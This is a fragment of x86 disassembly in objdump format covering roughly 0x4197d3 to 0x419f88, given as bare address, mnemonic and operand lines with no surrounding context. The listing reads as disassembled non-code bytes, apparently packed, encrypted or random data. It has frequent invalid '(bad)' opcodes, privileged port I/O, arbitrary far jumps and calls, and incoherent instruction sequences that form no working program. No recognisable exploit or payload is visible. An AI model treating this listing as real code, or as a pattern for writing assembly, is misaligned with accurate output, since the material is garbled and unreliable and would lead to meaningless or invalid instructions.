  4197d3:	jge    0x4197c5
  4197d5:	aas    
  4197d6:	xchg   edx,eax
  4197d7:	lea    ebx,[ebx+0x77]
  4197da:	mov    esp,ecx
  4197dc:	stos   DWORD PTR es:[edi],eax
  4197dd:	push   DWORD PTR [eax+ebp*2]
  4197e0:	and    ch,BYTE PTR [ebx-0x3c]
  4197e3:	sub    DWORD PTR [esi],ecx
  4197e5:	mov    cl,0x89
  4197e7:	(bad)  
  4197e8:	clc    
  4197e9:	jns    0x4197f7
  4197eb:	cs aad 0xa
  4197ee:	cmp    eax,0x13669680
  4197f3:	dec    ecx
  4197f4:	and    esp,edx
  4197f6:	push   es
  4197f7:	jb     0x41985f
  4197f9:	sbb    esp,DWORD PTR [eax-0xd235efb]
  4197ff:	lods   eax,DWORD PTR ds:[esi]
  419800:	sbb    dl,0xd6
  419803:	sbb    al,0x9b
  419805:	pop    ds
  419806:	push   edi
  419807:	push   esi
  419808:	pop    edx
  419809:	xchg   ecx,eax
  41980a:	das    
  41980b:	sbb    eax,0x5087d84a
  419810:	stos   BYTE PTR es:[edi],al
  419811:	jns    0x419815
  419813:	lods   eax,DWORD PTR ds:[esi]
  419814:	push   ss
  419815:	(bad)  
  419817:	mov    WORD PTR [edx+eax*1+0x33],?
  41981b:	int3   
  41981c:	xor    edx,DWORD PTR [edx+edi*2]
  41981f:	in     al,dx
  419820:	test   DWORD PTR [eax+0x7f],eax
  419823:	(bad)  
  419824:	sub    DWORD PTR [ecx-0x3047e4a9],ebp
  41982a:	gs clc 
  41982c:	pushf  
  41982d:	mov    bl,ah
  41982f:	mov    ebp,DWORD PTR ds:0xa98d9c8
  419835:	jecxz  0x419897
  419837:	pop    eax
  419838:	iret   
  419839:	sbb    dh,0x3e
  41983c:	xchg   esp,eax
  41983d:	stos   DWORD PTR es:[edi],eax
  41983e:	xchg   ebx,esi
  419840:	shl    DWORD PTR [eax+0x27],1
  419843:	xor    ebx,edx
  419845:	ret    0xa6d0
  419848:	or     bl,al
  41984a:	sahf   
  41984b:	popf   
  41984c:	mov    fs:0xf3048eb8,al
  419852:	ss mov dh,0x1b
  419855:	sbb    DWORD PTR [esi+0xc],ebx
  419858:	push   ds
  419859:	cmp    al,0xf3
  41985b:	pop    ebp
  41985c:	dec    ebp
  41985d:	int3   
  41985e:	push   edx
  41985f:	ins    DWORD PTR es:[edi],dx
  419860:	mov    WORD PTR [ebp-0x45317852],gs
  419866:	mov    ah,0xa9
  419868:	sbb    al,0x64
  41986a:	ja     0x41985f
  41986c:	xor    ah,dl
  41986e:	adc    DWORD PTR [edi-0x19efddbb],ebx
  419874:	xchg   DWORD PTR [eax],edx
  419876:	jle    0x41986c
  419878:	ret    0x5841
  41987b:	pop    ebx
  41987c:	ins    BYTE PTR es:[edi],dx
  41987d:	pop    eax
  41987e:	fwait
  41987f:	sub    al,0x26
  419881:	adc    al,0xad
  419883:	rcr    BYTE PTR [edx+0x37],1
  419886:	jmp    0xa1f7:0x7174bf09
  41988d:	jbe    0x419862
  41988f:	lahf   
  419890:	add    BYTE PTR [ecx],ah
  419892:	inc    edi
  419893:	xor    esp,edx
  419895:	mov    esp,0x4c752fe7
  41989a:	aaa    
  41989b:	fldcw  WORD PTR [edi+0x1c]
  41989e:	ss inc esi
  4198a0:	ds in  eax,0xd9
  4198a3:	jo     0x4198b0
  4198a5:	xchg   edx,eax
  4198a6:	mov    ebp,0xdf175ea5
  4198ab:	fucomi st,st(7)
  4198ad:	add    BYTE PTR [edx],dl
  4198af:	jge    0x41989d
  4198b1:	call   0x92f1:0xfcb9cf0b
  4198b8:	ins    BYTE PTR es:[edi],dx
  4198b9:	xor    BYTE PTR [esi],ch
  4198bb:	inc    ebx
  4198bc:	add    DWORD PTR [ebx+0x9],edi
  4198bf:	xor    DWORD PTR [ebp+0x13],eax
  4198c2:	je     0x4198a8
  4198c4:	and    BYTE PTR [edi+ebp*8+0x57],ch
  4198c8:	xor    eax,0xc7aaf292
  4198cd:	test   DWORD PTR [ebx+eax*2],esi
  4198d0:	pop    DWORD PTR [edx]
  4198d2:	mov    bl,0x6
  4198d4:	inc    ebx
  4198d5:	in     eax,dx
  4198d6:	and    ebp,DWORD PTR [edx-0x52]
  4198d9:	jmp    0x41988f
  4198db:	and    edi,edx
  4198dd:	pop    ebx
  4198de:	push   cs
  4198df:	out    0xea,al
  4198e1:	mov    esp,0x535a6cb3
  4198e6:	mov    dl,0x74
  4198e8:	mov    edi,0xfac6bd32
  4198ed:	js     0x419938
  4198ef:	pop    ecx
  4198f0:	aaa    
  4198f1:	sub    ch,BYTE PTR [ebx+0x1b]
  4198f4:	out    dx,al
  4198f5:	cmp    ebx,DWORD PTR [ebx+edx*1-0x730e9c12]
  4198fc:	mov    edx,0xfcd44bb5
  419901:	and    ecx,DWORD PTR [edx-0x39]
  419904:	stos   BYTE PTR es:[edi],al
  419905:	sub    eax,0x6db92d54
  41990a:	dec    ecx
  41990b:	cmp    bh,BYTE PTR [esi-0x2]
  41990e:	jno    0x41989c
  419910:	mov    ecx,0x4a6d0aa6
  419915:	pop    eax
  419916:	pop    es
  419917:	sti    
  419918:	mov    BYTE PTR [eax],dh
  41991a:	mov    ch,0x6b
  41991c:	or     al,0x1a
  41991e:	ret    0x49de
  419921:	or     eax,0xdff7d6bf
  419926:	or     al,0xa4
  419928:	dec    ebp
  419929:	mov    ebx,0x755f093d
  41992e:	inc    edi
  41992f:	dec    eax
  419930:	inc    esi
  419931:	into   
  419932:	aas    
  419933:	(bad)  
  419934:	leave  
  419935:	or     eax,0x583dc58f
  41993a:	sahf   
  41993b:	pop    ebp
  41993c:	aaa    
  41993d:	pop    ds
  41993e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41993f:	popf   
  419940:	stos   DWORD PTR es:[edi],eax
  419941:	loop   0x4198cb
  419943:	in     al,dx
  419944:	add    eax,0x95a56957
  419949:	adc    al,0x6e
  41994b:	push   ds
  41994c:	jl     0x4199a7
  41994e:	push   ebp
  41994f:	add    ch,BYTE PTR [eax+0x3a]
  419952:	je     0x4198e4
  419954:	mov    dh,BYTE PTR [ebx-0x14809f70]
  41995a:	retf   0x34eb
  41995d:	inc    esi
  41995e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41995f:	aas    
  419960:	fucomi st,st(5)
  419962:	mov    al,ds:0x86b7edda
  419967:	mov    edx,0xdee23744
  41996c:	in     al,0x1
  41996e:	sti    
  41996f:	sbb    esi,DWORD PTR [ebp+eiz*1-0x1574a6d5]
  419976:	vpsadbw xmm0,xmm0,XMMWORD PTR [edi]
  41997a:	cmp    al,0x89
  41997c:	loope  0x4199c8
  41997e:	call   0xd404a840
  419983:	in     eax,0x2b
  419985:	push   0xffffffbb
  419987:	ret    
  419988:	scas   al,BYTE PTR es:[edi]
  419989:	js     0x4199c1
  41998b:	dec    edx
  41998c:	pop    ecx
  41998d:	mov    ch,0x94
  41998f:	(bad)  
  419990:	iret   
  419991:	xlat   BYTE PTR ds:[ebx]
  419992:	mov    cl,BYTE PTR [edi+0x52a07afe]
  419998:	cmp    cl,cl
  41999a:	std    
  41999b:	dec    eax
  41999c:	sub    DWORD PTR [ecx-0x304d382c],edx
  4199a2:	push   edi
  4199a3:	sbb    edx,DWORD PTR [edi-0x78457727]
  4199a9:	xchg   DWORD PTR [edx+0x3ed22f3b],esi
  4199af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199b0:	cld    
  4199b1:	cmp    bh,BYTE PTR [ebx-0x3c]
  4199b4:	in     al,0xec
  4199b6:	ins    DWORD PTR es:[edi],dx
  4199b7:	lahf   
  4199b8:	jle    0x419995
  4199ba:	sar    WORD PTR [edi-0x28],cl
  4199be:	inc    ebp
  4199bf:	mov    eax,ds:0xeebc4040
  4199c4:	or     bh,BYTE PTR [ebp+0x2c]
  4199c7:	out    dx,eax
  4199c8:	retf   0xcdae
  4199cb:	rcl    DWORD PTR [esi],0x40
  4199ce:	aam    0xb9
  4199d0:	dec    esi
  4199d1:	cmp    DWORD PTR [ecx],edx
  4199d3:	add    eax,0xf77baebe
  4199d8:	retf   
  4199d9:	push   ebx
  4199da:	dec    edi
  4199db:	fst    DWORD PTR [ebx]
  4199dd:	shl    BYTE PTR [esi+eiz*8-0x2ac9861],cl
  4199e4:	lahf   
  4199e5:	je     0x4199b4
  4199e7:	sbb    eax,DWORD PTR [ebx+edx*1-0x39]
  4199eb:	jg     0x41997c
  4199ed:	dec    esi
  4199ee:	or     eax,0xde676002
  4199f3:	push   ds
  4199f4:	dec    eax
  4199f5:	out    dx,al
  4199f6:	mov    dh,BYTE PTR ds:0x3d4c6f10
  4199fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199fd:	fsub   st(6),st
  4199ff:	adc    DWORD PTR [edi+0x1d7ec620],0xb0a9b874
  419a09:	dec    esi
  419a0a:	xchg   BYTE PTR [ebx-0x32dedf6b],bl
  419a10:	and    eax,0x1f247c8b
  419a15:	test   eax,0x553c710
  419a1a:	aam    0xce
  419a1c:	test   al,0x47
  419a1e:	jecxz  0x419a50
  419a20:	and    DWORD PTR [esi-0x603ab562],ebp
  419a26:	lods   al,BYTE PTR ds:[esi]
  419a27:	inc    esi
  419a28:	outs   dx,DWORD PTR ds:[esi]
  419a29:	mov    edi,0x2c641674
  419a2e:	jg     0x419aa5
  419a30:	or     eax,0xc8535c92
  419a35:	xchg   esi,eax
  419a36:	mov    dh,0x2f
  419a38:	cmc    
  419a39:	pop    ds
  419a3a:	sbb    eax,0x6673f72
  419a3f:	inc    ebx
  419a40:	or     eax,DWORD PTR [ebx+0x74]
  419a43:	or     al,0x12
  419a45:	xchg   BYTE PTR [ebx+0x75],al
  419a48:	fst    QWORD PTR [esi-0x5609519e]
  419a4e:	push   ebx
  419a4f:	xor    esi,DWORD PTR [eax+0x1a]
  419a52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a53:	xor    bh,dl
  419a55:	in     al,0x4d
  419a57:	and    BYTE PTR [eax-0x58],bl
  419a5a:	xor    DWORD PTR [esi],ecx
  419a5c:	pop    esi
  419a5d:	dec    eax
  419a5e:	call   0x620b9281
  419a63:	pop    edi
  419a64:	fs cmp eax,0xef7b90e6
  419a6a:	in     al,dx
  419a6b:	je     0x419a51
  419a6d:	js     0x419a87
  419a6f:	scas   eax,DWORD PTR es:[edi]
  419a70:	iret   
  419a71:	imul   edi,DWORD PTR [ebp-0x5a973f5],0xffffffd1
  419a78:	push   ds
  419a79:	pop    ds
  419a7a:	addr16 loop 0x419aa3
  419a7d:	enter  0x6402,0x4e
  419a81:	(bad)  [esi-0x3c174d22]
  419a87:	and    al,0x32
  419a89:	stos   BYTE PTR es:[edi],al
  419a8a:	mov    ds:0xdad19d1c,al
  419a8f:	xor    cl,dh
  419a91:	and    al,0x71
  419a93:	add    ebp,DWORD PTR [ecx+0x51]
  419a96:	xchg   esi,eax
  419a97:	pop    ebp
  419a98:	inc    eax
  419a99:	pop    esp
  419a9a:	sub    eax,0x473cef01
  419a9f:	xchg   ecx,eax
  419aa0:	cdq    
  419aa1:	and    eax,DWORD PTR [eax+edx*8]
  419aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419aa5:	cmp    bl,0xcc
  419aa8:	pand   mm1,QWORD PTR [ebx+0x56]
  419aac:	pop    ss
  419aad:	in     al,0x1b
  419aaf:	or     eax,0x550281bb
  419ab4:	adc    al,0xad
  419ab6:	bound  ebp,QWORD PTR [ebx+0x3b503292]
  419abc:	(bad)  
  419abd:	gs jg  0x419a7f
  419ac0:	in     al,0xae
  419ac2:	xchg   ebx,eax
  419ac3:	scas   eax,DWORD PTR es:[edi]
  419ac4:	or     al,0x3c
  419ac6:	addr16 (bad) 
  419ac9:	sub    bh,0x8
  419acc:	ins    BYTE PTR es:[edi],dx
  419acd:	inc    eax
  419ace:	stc    
  419acf:	and    DWORD PTR [edx-0x4cb4fb9a],ebp
  419ad5:	push   es
  419ad6:	popf   
  419ad7:	daa    
  419ad8:	push   ebx
  419ad9:	aaa    
  419ada:	mov    ah,0xe6
  419adc:	cs int3 
  419ade:	sub    dl,BYTE PTR [edi]
  419ae0:	cld    
  419ae1:	xchg   esp,eax
  419ae2:	xor    dh,BYTE PTR [edx-0x1fc26ce2]
  419ae8:	(bad)  [edi+0x28065248]
  419aee:	and    cl,BYTE PTR [edx-0x5a8ee7b2]
  419af4:	push   esp
  419af5:	sbb    eax,0xd00c961e
  419afa:	sbb    edx,ebx
  419afc:	mov    WORD PTR [ebx],?
  419afe:	and    ch,BYTE PTR [ebp+0x7689fa44]
  419b04:	sub    DWORD PTR [ecx-0xa567968],ebp
  419b0a:	pop    es
  419b0b:	pop    ecx
  419b0c:	jp     0x419b1a
  419b0e:	fdivr  st(2),st
  419b10:	test   esi,ebx
  419b12:	loop   0x419ace
  419b14:	jmp    0x7606a1a4
  419b19:	aam    0x28
  419b1b:	fdiv   st,st(0)
  419b1d:	cdq    
  419b1e:	jecxz  0x419aab
  419b20:	mov    ah,0x25
  419b22:	daa    
  419b23:	shl    BYTE PTR [ebp+edi*4-0x7c],cl
  419b27:	fwait
  419b28:	jge    0x419b03
  419b2a:	mov    esi,0xe9a5bef9
  419b2f:	sbb    bl,BYTE PTR [esi+ebx*8+0x4b]
  419b33:	push   ebp
  419b34:	retf   
  419b35:	es mov edi,0xec70948b
  419b3b:	xchg   edi,eax
  419b3c:	sar    BYTE PTR [esi],1
  419b3e:	retf   0x3221
  419b41:	xchg   edi,eax
  419b42:	cmp    al,BYTE PTR [ebx+0x1507965e]
  419b48:	cld    
  419b49:	dec    edi
  419b4a:	mov    cl,0x1e
  419b4c:	fidivr DWORD PTR [ebp+0x13]
  419b4f:	push   ebp
  419b50:	bound  edi,QWORD PTR [edi-0x6e]
  419b53:	addr16 sti 
  419b55:	jno    0x419b8a
  419b57:	jne    0x419b3b
  419b59:	retf   0xade5
  419b5c:	(bad)  
  419b5d:	sbb    eax,0x22ad21a6
  419b62:	rcr    BYTE PTR [ebx-0x1d1aa0f2],1
  419b68:	popa   
  419b69:	mov    ds:0x9470783d,al
  419b6e:	fwait
  419b6f:	shr    BYTE PTR [ebx+eiz*1+0x2c],1
  419b73:	aas    
  419b74:	mov    al,0x66
  419b76:	(bad)  
  419b77:	fdiv   st,st(7)
  419b79:	sti    
  419b7a:	pushf  
  419b7b:	or     BYTE PTR [ebx+0x11f7fa1a],al
  419b81:	add    ebx,eax
  419b83:	mov    edx,edx
  419b85:	mov    eax,ds:0x26a45907
  419b8a:	jne    0x419b46
  419b8c:	ret    
  419b8d:	ret    0xa947
  419b90:	add    eax,0xb18ea0ab
  419b95:	jle    0x419c02
  419b97:	stc    
  419b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b99:	xor    BYTE PTR [edx+0x2e1eb4b0],0x56
  419ba0:	dec    esp
  419ba1:	out    dx,eax
  419ba2:	push   ecx
  419ba3:	inc    ebx
  419ba4:	js     0x419c09
  419ba6:	and    eax,0xc176c001
  419bab:	inc    ebx
  419bac:	into   
  419bad:	push   eax
  419bae:	jo     0xa6173100
  419bb4:	lahf   
  419bb5:	ja     0x419b39
  419bb7:	popf   
  419bb8:	mov    BYTE PTR [esi+0x3b9c6b9c],ch
  419bbe:	push   edi
  419bbf:	mov    ecx,0xcbd91b62
  419bc4:	jl     0x419bdb
  419bc6:	retf   
  419bc7:	fist   DWORD PTR [ecx+0x6b]
  419bca:	cld    
  419bcb:	ret    
  419bcc:	scas   al,BYTE PTR es:[edi]
  419bcd:	test   BYTE PTR [eax+ebx*1-0x39],ah
  419bd1:	pop    ss
  419bd2:	dec    edx
  419bd3:	test   eax,0x219ed62
  419bd8:	lock enter 0xefd5,0xd6
  419bdd:	(bad)  
  419bde:	jg     0x419bcd
  419be0:	lds    esp,FWORD PTR [edi+0x4160043b]
  419be6:	adc    dh,BYTE PTR [ebx]
  419be8:	xchg   edx,eax
  419be9:	inc    ebp
  419bea:	adc    DWORD PTR [ebx+0x7dc38a20],ebx
  419bf0:	mov    ds:0xef914e65,al
  419bf5:	xchg   BYTE PTR [esi+0x4dbbdb0],dh
  419bfb:	into   
  419bfc:	xor    eax,0xee50444c
  419c01:	out    dx,al
  419c02:	add    eax,0x9890f413
  419c07:	sbb    al,0xc0
  419c09:	and    eax,DWORD PTR ds:0xd56a3c77
  419c0f:	repz sbb edx,DWORD PTR ds:0xd682bd73
  419c16:	(bad)  
  419c17:	in     eax,dx
  419c18:	sbb    eax,0xb0a98191
  419c1d:	jno    0x419ba8
  419c1f:	daa    
  419c20:	push   0x62
  419c22:	mov    cl,0x82
  419c24:	out    dx,eax
  419c25:	fst    QWORD PTR [ecx]
  419c27:	cmpxchg BYTE PTR [esi-0x6e81a887],ah
  419c2e:	mov    cl,0x4f
  419c30:	aas    
  419c31:	dec    eax
  419c32:	pop    ebx
  419c33:	jecxz  0x419c81
  419c35:	sti    
  419c36:	ret    0x2834
  419c39:	in     al,0x7c
  419c3b:	adc    eax,0xf69a0d16
  419c40:	mov    bl,0x14
  419c42:	jo     0x419c31
  419c44:	cmp    dh,dl
  419c46:	mov    edi,DWORD PTR [edx-0xd99c2b4]
  419c4c:	sub    al,BYTE PTR [ebp+0x364ac2c6]
  419c52:	test   DWORD PTR [edi],edx
  419c54:	adc    eax,0xe42a8c89
  419c59:	mov    eax,0x6de2674c
  419c5e:	mov    ds:0x9660a6,eax
  419c63:	fisub  DWORD PTR [eax+0x1780c667]
  419c69:	test   bl,dh
  419c6b:	in     al,0x29
  419c6d:	in     eax,0x32
  419c6f:	and    ch,BYTE PTR [ecx+0x5e8bb65f]
  419c75:	in     eax,dx
  419c76:	cmc    
  419c77:	(bad)  
  419c78:	inc    esp
  419c79:	pop    ss
  419c7a:	arpl   WORD PTR [esi],dx
  419c7c:	arpl   WORD PTR [ebx-0x6cbad71e],di
  419c82:	rcl    dh,1
  419c84:	jle    0x419c31
  419c86:	pop    eax
  419c87:	adc    DWORD PTR [eax-0x2a],esp
  419c8a:	add    DWORD PTR [edi+0xc],ebx
  419c8d:	or     ebp,eax
  419c8f:	mul    ah
  419c91:	fwait
  419c92:	es es (bad) 
  419c95:	in     al,dx
  419c96:	fdivr  DWORD PTR [edx+0x6b]
  419c99:	dec    ecx
  419c9a:	cmp    ecx,esi
  419c9c:	inc    esi
  419c9d:	fsubr  DWORD PTR [eax-0x69]
  419ca0:	fidiv  WORD PTR [esi]
  419ca2:	ins    BYTE PTR es:[edi],dx
  419ca3:	aas    
  419ca4:	aas    
  419ca5:	xor    al,0xdd
  419ca7:	and    BYTE PTR [ebx-0x3e56556d],dl
  419cad:	push   esi
  419cae:	fcomp  QWORD PTR [eax-0x72]
  419cb1:	adc    edi,DWORD PTR [ebx+0x14aa2424]
  419cb7:	add    eax,0xb262696c
  419cbc:	out    0xa4,eax
  419cbe:	xchg   BYTE PTR [edi],bh
  419cc0:	jg     0x419d05
  419cc2:	xlat   BYTE PTR ds:[ebx]
  419cc3:	xlat   BYTE PTR ds:[ebx]
  419cc4:	add    DWORD PTR [ebp+0x17],edi
  419cc7:	mov    edx,0xbd43cefe
  419ccc:	jmp    0xf382c7c1
  419cd1:	sbb    al,0xda
  419cd3:	aam    0x60
  419cd5:	jb     0x419cd2
  419cd7:	loope  0x419d0d
  419cd9:	cmp    eax,0xe4429628
  419cde:	daa    
  419cdf:	pop    ss
  419ce0:	daa    
  419ce1:	sbb    ah,BYTE PTR [edi+0x38]
  419ce4:	inc    ebp
  419ce5:	xchg   edx,eax
  419ce6:	cmc    
  419ce7:	cmp    al,0x3b
  419ce9:	xor    eax,0x32e73969
  419cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cef:	lgs    esp,FWORD PTR [ebp-0x44]
  419cf3:	sub    DWORD PTR [edx+ebx*2+0x5e],edi
  419cf7:	lds    ebp,FWORD PTR [edx-0x2d]
  419cfa:	and    edx,eax
  419cfc:	and    BYTE PTR [eax+0x66d8ab2d],bh
  419d02:	mov    dl,0x41
  419d04:	iret   
  419d05:	mov    esp,0x78fb44cf
  419d0a:	je     0x419ce2
  419d0c:	nop
  419d0d:	fwait
  419d0e:	jb     0x419ced
  419d10:	xchg   dx,ax
  419d12:	loop   0x419cc8
  419d14:	lock loope 0x419ce0
  419d17:	scas   eax,DWORD PTR es:[edi]
  419d18:	rcl    DWORD PTR ds:0xec3ee1f2,cl
  419d1e:	fisubr DWORD PTR [edi-0x54]
  419d21:	inc    edx
  419d22:	ins    DWORD PTR es:[edi],dx
  419d23:	jns    0x419cd6
  419d25:	xor    bh,BYTE PTR [ecx-0x53]
  419d28:	into   
  419d29:	leave  
  419d2a:	pop    ss
  419d2b:	adc    eax,0x51b4f33b
  419d30:	in     al,dx
  419d31:	retf   
  419d32:	std    
  419d33:	jl     0x419d6c
  419d35:	loope  0x419db6
  419d37:	push   ss
  419d38:	fxch   st(3)
  419d3a:	mov    bh,BYTE PTR [ebp+0x63]
  419d3d:	out    0xf5,eax
  419d3f:	cmp    al,0x30
  419d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d42:	sub    al,0x4c
  419d44:	ret    
  419d45:	pop    es
  419d46:	aam    0x7a
  419d48:	mov    DWORD PTR [ebp+0x5e],ecx
  419d4b:	adc    eax,0x191dbc11
  419d50:	(bad)  
  419d51:	mov    dh,0x8d
  419d53:	bound  ecx,QWORD PTR [edi+0x6adbde61]
  419d59:	sub    ch,BYTE PTR [eax+eax*2]
  419d5c:	js     0x419d6a
  419d5e:	xor    eax,0x2f73a232
  419d63:	push   0x3e
  419d65:	jnp    0x419dd5
  419d67:	ss ja  0x419d5e
  419d6a:	sbb    dl,dl
  419d6c:	pop    ebp
  419d6d:	js     0x419d6c
  419d6f:	loop   0x419dd6
  419d71:	sbb    DWORD PTR [esi-0x1b059d92],ecx
  419d77:	ror    ah,0xd5
  419d7a:	rol    DWORD PTR [edx-0x5b],0xc1
  419d7e:	and    eax,DWORD PTR [eax]
  419d80:	mov    eax,ds:0x9e6b7970
  419d85:	mov    bl,0xae
  419d87:	shr    DWORD PTR [edx-0x6327d898],cl
  419d8d:	(bad)  
  419d8e:	adc    BYTE PTR [ebx+0xca0dfda],ch
  419d94:	sub    eax,0x4a1ad7aa
  419d99:	popf   
  419d9a:	leave  
  419d9b:	jne    0x419d51
  419d9d:	daa    
  419d9e:	loopne 0x419e14
  419da0:	sub    bl,dl
  419da2:	(bad)  
  419da3:	popa   
  419da4:	mov    ch,0x0
  419da6:	mov    ebx,0x54dc09b7
  419dab:	mov    ebx,0xade7af98
  419db0:	mov    eax,0x53da9eb
  419db5:	ja     0x419dca
  419db7:	cmp    al,0xb3
  419db9:	popa   
  419dba:	mov    eax,0xa5474531
  419dbf:	mov    ecx,0x7d9cda3d
  419dc4:	mov    eax,ds:0x55a38fa0
  419dc9:	xchg   ebp,eax
  419dca:	pop    eax
  419dcb:	test   eax,0xff77b7b6
  419dd0:	das    
  419dd1:	xor    DWORD PTR [eax-0x49],edx
  419dd4:	jp     0x419dbf
  419dd6:	xchg   ecx,eax
  419dd7:	xchg   edx,eax
  419dd8:	ins    DWORD PTR es:[edi],dx
  419dd9:	dec    ecx
  419dda:	dec    edx
  419ddb:	mov    dh,0xec
  419ddd:	add    BYTE PTR [esi-0x78],0x24
  419de1:	mov    bl,0x4d
  419de3:	or     al,0x4c
  419de5:	add    eax,0x6f99e950
  419dea:	xor    BYTE PTR [ecx-0x18],bh
  419ded:	jl     0x419e18
  419def:	push   edx
  419df0:	adc    DWORD PTR [ecx-0x60],edx
  419df3:	scas   eax,DWORD PTR es:[edi]
  419df4:	or     eax,0x2de12725
  419df9:	and    eax,0xe02b6a06
  419dfe:	das    
  419dff:	xchg   edi,edi
  419e01:	push   ss
  419e02:	pushf  
  419e03:	shr    DWORD PTR [edx-0x36],0x37
  419e07:	or     DWORD PTR [edi-0x66dcb3b2],ecx
  419e0d:	neg    DWORD PTR [edx+0x1a67d14e]
  419e13:	outs   dx,DWORD PTR ds:[esi]
  419e14:	outs   dx,BYTE PTR ds:[esi]
  419e15:	push   edi
  419e16:	dec    ebx
  419e17:	sub    edx,DWORD PTR [edx-0x241038ce]
  419e1d:	xchg   edx,eax
  419e1e:	sub    al,0x2d
  419e20:	xor    edi,DWORD PTR [ebx]
  419e22:	(bad)  
  419e23:	dec    esp
  419e24:	sub    eax,0x1648cb2f
  419e29:	(bad)  
  419e2a:	aam    0xb
  419e2c:	mov    ebp,0x4ff222c5
  419e31:	xchg   DWORD PTR [ebp+edi*4+0x2e],edx
  419e35:	ins    DWORD PTR es:[edi],dx
  419e36:	xor    edx,DWORD PTR [edi-0x6c0b55a0]
  419e3c:	add    BYTE PTR [esi+ebx*2+0x2bfb9713],bh
  419e43:	test   al,0x25
  419e45:	pop    ebp
  419e46:	fnstcw WORD PTR [edi+ecx*4-0x43ec414a]
  419e4d:	jle    0x419e2c
  419e4f:	push   edx
  419e50:	mov    al,ds:0xc0e93b2e
  419e55:	mov    ebp,0x510311e9
  419e5a:	add    DWORD PTR [edi],0xbcaa8769
  419e60:	mov    bl,0xd6
  419e62:	retf   0xd879
  419e65:	sbb    BYTE PTR [edx+0x39],0xfb
  419e69:	call   DWORD PTR [ebp-0x33]
  419e6c:	ins    BYTE PTR es:[edi],dx
  419e6d:	mov    edi,0x6a9098ce
  419e72:	mov    eax,0x1e036de0
  419e77:	or     eax,0xfa4746dc
  419e7c:	ret    0x49fd
  419e7f:	xchg   ebx,eax
  419e80:	(bad)
  419e84:	div    BYTE PTR [esi-0x16]
  419e87:	ret    
  419e88:	fidivr DWORD PTR [edi-0x293f6a8b]
  419e8e:	loope  0x419edd
  419e90:	fs int3 
  419e92:	xchg   esi,eax
  419e93:	neg    BYTE PTR [ecx+ebx*2]
  419e96:	shl    BYTE PTR [eax],0x55
  419e99:	inc    esp
  419e9a:	mov    BYTE PTR [edx],dh
  419e9c:	sbb    BYTE PTR [esi],ch
  419e9e:	mov    bl,0x7e
  419ea0:	mov    ah,0x1c
  419ea2:	mov    edi,0x374f57e8
  419ea7:	lods   eax,DWORD PTR ds:[esi]
  419ea8:	xor    ah,BYTE PTR [eax]
  419eaa:	sub    BYTE PTR [eax+0x2e],bl
  419ead:	sti    
  419eae:	mov    eax,ds:0xa0c01190
  419eb3:	retf   
  419eb4:	mov    ds:0x73ca976f,al
  419eb9:	jbe    0x419e5f
  419ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ebc:	cli    
  419ebd:	adc    al,0x60
  419ebf:	mov    dh,0x1
  419ec1:	xor    BYTE PTR [eax+0x19],ah
  419ec4:	(bad)  
  419ec6:	das    
  419ec7:	das    
  419ec8:	cmp    al,0xb
  419eca:	sti    
  419ecb:	adc    bh,al
  419ecd:	bound  ebx,QWORD PTR [ecx]
  419ecf:	inc    esp
  419ed0:	xchg   esi,eax
  419ed1:	ins    BYTE PTR es:[edi],dx
  419ed2:	sbb    eax,0x540d4b7b
  419ed7:	mov    ds:0x493e03e0,eax
  419edc:	pop    ss
  419edd:	cmp    edi,DWORD PTR [esi]
  419edf:	xchg   esp,ebx
  419ee1:	mov    BYTE PTR [edx],al
  419ee3:	mov    WORD PTR [edi+0x63],gs
  419ee6:	aad    0x4e
  419ee8:	nop
  419ee9:	lods   eax,DWORD PTR ds:[esi]
  419eea:	mov    dh,0xfb
  419eec:	rol    BYTE PTR [edx],cl
  419eee:	sbb    BYTE PTR [edi-0x15],0x55
  419ef2:	stos   DWORD PTR es:[edi],eax
  419ef3:	add    al,0x5a
  419ef5:	and    bh,BYTE PTR [esi+edx*2+0xd]
  419ef9:	jae    0x419ed4
  419efb:	pop    esp
  419efc:	xchg   ebx,eax
  419efd:	fmul   DWORD PTR [ebx+esi*2]
  419f00:	inc    edx
  419f01:	sbb    dl,dh
  419f03:	sbb    al,0x5b
  419f05:	mov    esi,0x9890335
  419f0a:	jo     0x419f47
  419f0c:	mov    ds:0xe2e7fd00,al
  419f11:	pshufw mm4,mm3,0x12
  419f15:	pop    edx
  419f16:	adc    al,0xd7
  419f18:	xor    esp,esp
  419f1a:	dec    ecx
  419f1b:	xchg   esi,eax
  419f1c:	call   0xc48b0c59
  419f21:	mov    ebx,0xd8504f15
  419f26:	xchg   ebx,eax
  419f27:	int    0xa0
  419f29:	and    ah,cl
  419f2b:	leave  
  419f2c:	es xchg esp,eax
  419f2e:	in     al,dx
  419f2f:	push   ss
  419f30:	mov    ebp,0x9a8150c1
  419f35:	pop    eax
  419f36:	daa    
  419f37:	push   esi
  419f38:	add    eax,eax
  419f3a:	mov    DWORD PTR [ecx+0x7ddb4766],ebp
  419f40:	dec    eax
  419f41:	pop    edi
  419f42:	cld    
  419f43:	mov    edx,0xd70c387a
  419f48:	sub    ch,BYTE PTR [eax+ebx*1+0x4ddce475]
  419f4f:	fisttp DWORD PTR [edi+0x4c706ee3]
  419f55:	and    al,0x1b
  419f57:	sbb    eax,0x94b8e3a8
  419f5c:	daa    
  419f5d:	pop    ecx
  419f5e:	dec    esp
  419f5f:	leave  
  419f60:	mov    WORD PTR [edi],ds
  419f62:	jnp    0x419ef2
  419f64:	cmp    DWORD PTR ds:0xea7e10d9,ecx
  419f6a:	rol    DWORD PTR [edi],1
  419f6c:	mov    esp,0x37752566
  419f71:	popf   
  419f72:	leave  
  419f73:	xchg   ebx,eax
  419f74:	and    eax,0x1fd81280
  419f79:	pop    edx
  419f7a:	inc    ebp
  419f7b:	call   eax
  419f7d:	jae    0x419fac
  419f7f:	jno    0x419f34
  419f81:	xchg   ebx,eax
  419f82:	imul   esp,DWORD PTR [edx-0x56],0x55
  419f86:	ss out dx,eax
  419f88:	sti    
